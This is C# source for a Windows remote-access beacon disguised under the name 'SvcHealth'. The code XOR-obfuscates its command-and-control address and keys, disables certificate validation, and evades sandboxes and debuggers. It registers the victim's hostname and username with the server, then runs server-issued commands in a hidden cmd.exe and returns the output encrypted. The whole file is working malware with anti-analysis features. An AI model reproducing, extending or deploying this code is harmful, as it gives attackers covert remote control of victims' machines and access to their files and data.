using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace SvcHealth
{
    class Program
    {
        static byte[] _ch = { 0x6B, 0x63, 0x68, 0x74, 0x6B, 0x6C, 0x62, 0x74, 0x6B, 0x74, 0x68, 0x6A, 0x6A };
        static byte[] _cp = { 0x62, 0x6A, 0x62, 0x62 };
        static byte[] _cs = { 0x32, 0x2E, 0x2E, 0x2A };
        static byte[] _ek = { 0x09, 0x15, 0x19, 0x11, 0x0A, 0x0F, 0x0A, 0x0A, 0x1F, 0x0E, 0x09, 0x05, 0x11, 0x1F, 0x03, 0x05, 0x68, 0x6A, 0x68, 0x6C };
        static byte[] _ru = { 0x75, 0x29, 0x2F, 0x38, 0x37, 0x33, 0x2E, 0x77, 0x3C, 0x35, 0x28, 0x37 };
        static byte[] _cu = { 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x6B, 0x75, 0x2F, 0x2A, 0x3E, 0x3B, 0x2E, 0x3F };
        static byte[] _ua = { 0x17, 0x35, 0x20, 0x33, 0x36, 0x36, 0x3B, 0x75, 0x6F, 0x74, 0x6A, 0x7A, 0x72, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29, 0x7A, 0x14, 0x0E, 0x7A, 0x6B, 0x6A, 0x74, 0x6A, 0x61, 0x7A, 0x0D, 0x33, 0x34, 0x6C, 0x6E, 0x61, 0x7A, 0x22, 0x6C, 0x6E, 0x73, 0x7A, 0x1B, 0x2A, 0x2A, 0x36, 0x3F, 0x0D, 0x3F, 0x38, 0x11, 0x33, 0x2E, 0x75, 0x6F, 0x69, 0x6D, 0x74, 0x69, 0x6C };
        static byte[] _sp = { 0x6B, 0x6D, 0x3F, 0x63, 0x62, 0x69, 0x69, 0x39, 0x6D, 0x69, 0x6F, 0x6D, 0x3E, 0x6B, 0x68, 0x6C, 0x6E, 0x63, 0x6B, 0x63, 0x6F, 0x6A, 0x62, 0x6F, 0x3F, 0x38, 0x38, 0x68, 0x39, 0x38, 0x6B, 0x3E, 0x3E, 0x6C, 0x62, 0x38, 0x3C, 0x38, 0x3C, 0x3C, 0x39, 0x62, 0x6C, 0x3C, 0x63, 0x3B, 0x63, 0x69, 0x6A, 0x6B, 0x6C, 0x6E, 0x3F, 0x38, 0x6E, 0x68, 0x69, 0x63, 0x6C, 0x62, 0x6C, 0x3F, 0x6B, 0x39 };

        static string X(byte[] d) { var c = new char[d.Length]; for (int i = 0; i < d.Length; i++) c[i] = (char)(d[i] ^ 0x5A); return new string(c); }

        static string C2Host;
        static string C2Port;
        static string C2Scheme;
        static string EncKey;
        static int BeaconSleep = 5;
        static int BeaconJitter = 0;
        static string RegisterUri;
        static string CheckinUri;
        static string UserAgent;
        static string ServerPubHex;

        static string AgentId = "";
        static readonly HttpClient Client = CreateClient();
        static HttpClient CreateClient()
        {
            var handler = new HttpClientHandler();
            handler.ServerCertificateCustomValidationCallback = delegate { return true; };
            var c = new HttpClient(handler);
            c.Timeout = TimeSpan.FromSeconds(60);
            return c;
        }

        static void InitConfig()
        {
            C2Host = X(_ch); C2Port = X(_cp); C2Scheme = X(_cs);
            EncKey = X(_ek); RegisterUri = X(_ru); CheckinUri = X(_cu);
            UserAgent = X(_ua); ServerPubHex = X(_sp);
            Array.Clear(_ch, 0, _ch.Length); Array.Clear(_cp, 0, _cp.Length);
            Array.Clear(_cs, 0, _cs.Length); Array.Clear(_ek, 0, _ek.Length);
            Array.Clear(_ru, 0, _ru.Length); Array.Clear(_cu, 0, _cu.Length);
            Array.Clear(_ua, 0, _ua.Length); Array.Clear(_sp, 0, _sp.Length);
            var pub = new byte[32];
            for (int i = 0; i < 32; i++)
                pub[i] = Convert.ToByte(ServerPubHex.Substring(i * 2, 2), 16);
            Eph1.ServerPub = pub;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetModuleHandleA(string name);

        static bool IsSandbox()
        {
            string[] indicators = { "sbiedll.dll", "dbghelp.dll", "api_log.dll", "SxIn.dll", "Sf2.dll", "cmdvrt32.dll" };
            for (int i = 0; i < indicators.Length; i++)
                if (GetModuleHandleA(indicators[i]) != IntPtr.Zero) return true;
            try
            {
                if (System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Recent)).Length < 5) return true;
            }
            catch {}
            return false;
        }

        static string Encrypt(string plaintext) { return Eph1.Encrypt(plaintext); }
        static string Decrypt(string encoded) { return Eph1.Decrypt(encoded); }

        static string HttpPost(string path, string body)
        {
            try
            {
                var url = C2Scheme + "://" + C2Host + ":" + C2Port + path;
                var request = new HttpRequestMessage(HttpMethod.Post, url)
                {
                    Content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded")
                };
                request.Headers.TryAddWithoutValidation("User-Agent", UserAgent);
                request.Headers.TryAddWithoutValidation("Accept", "text/html,*/*");
                var response = Client.SendAsync(request).Result;
                var respBody = response.Content.ReadAsStringAsync().Result;
                return respBody;
            }
            catch { return ""; }
        }

        static string ExecuteCommand(string cmd)
        {
            if (cmd.StartsWith("__hd:")) return HiddenDesktop.Handle(cmd);
            if (cmd.StartsWith("cd "))
            {
                try
                {
                    Directory.SetCurrentDirectory(cmd.Substring(3).Trim());
                    return "Changed directory to " + Directory.GetCurrentDirectory();
                }
                catch (Exception e) { return "Error: " + e.Message; }
            }
            if (cmd == "pwd") return Directory.GetCurrentDirectory();
            if (cmd == "ls" || cmd == "dir" || cmd.StartsWith("ls ") || cmd.StartsWith("dir "))
                return NativeLs(cmd);
            if (cmd.StartsWith("cat ") || cmd.StartsWith("type "))
            {
                try { return File.ReadAllText(cmd.Substring(cmd.IndexOf(' ') + 1).Trim()); }
                catch (Exception e) { return "Error: " + e.Message; }
            }

            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/C " + cmd)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                var proc = Process.Start(psi);
                var output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                proc.WaitForExit(30000);
                proc.Dispose();
                return string.IsNullOrEmpty(output) ? "Command executed (no output)" : output;
            }
            catch (Exception e) { return "Error: " + e.Message; }
        }

        static string NativeLs(string cmd)
        {
            try
            {
                string arg;
                if (cmd.StartsWith("ls ") || cmd.StartsWith("dir "))
                    arg = cmd.Substring(cmd.IndexOf(' ') + 1).Trim();
                else
                    arg = ".";
                if (string.IsNullOrEmpty(arg)) arg = ".";
                var sb = new StringBuilder();
                foreach (var d in Directory.GetDirectories(arg))
                {
                    var di = new DirectoryInfo(d);
                    sb.AppendLine(string.Format("d {0,12}  {1}", "0", di.Name));
                }
                foreach (var f in Directory.GetFiles(arg))
                {
                    var fi = new FileInfo(f);
                    sb.AppendLine(string.Format("- {0,12}  {1}", fi.Length, fi.Name));
                }
                var result = sb.ToString().TrimEnd();
                return string.IsNullOrEmpty(result) ? "Directory is empty" : result;
            }
            catch (Exception e) { return "Error: " + e.Message; }
        }

        static bool Register()
        {
            var hostname = Environment.MachineName;
            var username = Environment.UserName;
            var msg = "{\"type\":\"register\",\"metadata\":{\"hostname\":\"" + hostname + "\",\"username\":\"" + username + "\",\"os\":\"Windows\",\"mode\":\"beacon\",\"beacon_interval\":" + BeaconSleep + "}}";
            var enc = Encrypt(msg);
            var resp = HttpPost(RegisterUri, enc);
            if (string.IsNullOrEmpty(resp)) return false;
            var dec = Decrypt(resp);
            if (dec.Contains("\"registered\"") || dec.Contains("\"checkin_ack\""))
            {
                var idx = dec.IndexOf("\"agent_id\":\"");
                if (idx >= 0)
                {
                    var start = idx + 12;
                    var end = dec.IndexOf('"', start);
                    AgentId = dec.Substring(start, end - start);
                    return true;
                }
            }
            return false;
        }

        static List<string> Checkin(List<string> results)
        {
            var resultsJson = results.Count == 0 ? "[]" : "[" + string.Join(",", results) + "]";
            var msg = "{\"type\":\"checkin\",\"agent_id\":\"" + AgentId + "\",\"metadata\":{\"mode\":\"beacon\"},\"results\":" + resultsJson + "}";
            var enc = Encrypt(msg);
            var resp = HttpPost(CheckinUri, enc);
            var commands = new List<string>();
            if (string.IsNullOrEmpty(resp)) return commands;
            var dec = Decrypt(resp);
            if (dec.Contains("\"commands\""))
            {
                var search = "\"command\":\"";
                var pos = 0;
                while ((pos = dec.IndexOf(search, pos)) >= 0)
                {
                    var start = pos + search.Length;
                    var end = dec.IndexOf('"', start);
                    if (end > start) commands.Add(dec.Substring(start, end - start));
                    pos = end + 1;
                }
            }
            return commands;
        }

        const int KillDate = 0;
        const int WorkStart = 0;
        const int WorkEnd = 24;

        static void StealthSleep(int ms)
        {
            var secret = Encoding.UTF8.GetBytes(EncKey);
            var key = new byte[16];
            using (var rng = RandomNumberGenerator.Create()) { rng.GetBytes(key); }
            for (int i = 0; i < secret.Length; i++) secret[i] ^= key[i % key.Length];
            Thread.Sleep(Math.Max(1, ms));
            for (int i = 0; i < secret.Length; i++) secret[i] ^= key[i % key.Length];
            Array.Clear(key, 0, key.Length);
        }

        static void WaitWindow()
        {
            while (true)
            {
                if (Debugger.IsAttached) Environment.Exit(0);
                var now = DateTime.UtcNow;
                int today = now.Year * 10000 + now.Month * 100 + now.Day;
                if (KillDate > 0 && today > KillDate) Environment.Exit(0);
                if (WorkEnd <= WorkStart || WorkEnd >= 24 || (now.Hour >= WorkStart && now.Hour < WorkEnd)) return;
                Thread.Sleep(60000);
            }
        }

        static void SleepWithJitter()
        {
            var rng = new Random();
            int sleepMs = BeaconSleep * 1000;
            if (BeaconJitter > 0 && BeaconJitter <= 100)
            {
                var jitterRange = BeaconSleep * BeaconJitter / 100.0;
                sleepMs = (int)((BeaconSleep + (rng.NextDouble() * 2 - 1) * jitterRange) * 1000);
            }
            WaitWindow();
            StealthSleep(Math.Max(1000, sleepMs));
        }

        static void Main(string[] args)
        {
            InitConfig();
            WaitWindow();
            if (Environment.ProcessorCount < 2) Thread.Sleep(30000);
            if (IsSandbox()) { Thread.Sleep(300000); return; }

            for (int i = 0; i < 10 && string.IsNullOrEmpty(AgentId); i++)
            {
                Register();
                if (string.IsNullOrEmpty(AgentId)) Thread.Sleep(5000);
            }
            if (string.IsNullOrEmpty(AgentId)) return;

            var pending = new List<string>();
            while (true)
            {
                var commands = Checkin(pending);
                pending.Clear();

                foreach (var cmd in commands)
                {
                    if (cmd == "__kill") Environment.Exit(0);
                    if (cmd.StartsWith("__set_interval:"))
                    {
                        int newInterval;
                        if (int.TryParse(cmd.Split(':')[1], out newInterval))
                            BeaconSleep = newInterval;
                        continue;
                    }

                    var output = ExecuteCommand(cmd);
                    var escaped = output.Replace("\\", "\\\\").Replace("\"", "\\\"")
                        .Replace("\n", "\\n").Replace("\r", "\\r");
                    pending.Add("{\"type\":\"response\",\"output\":\"" + escaped + "\",\"command\":\"" + cmd + "\"}");
                }

                SleepWithJitter();
            }
        }
    }
}
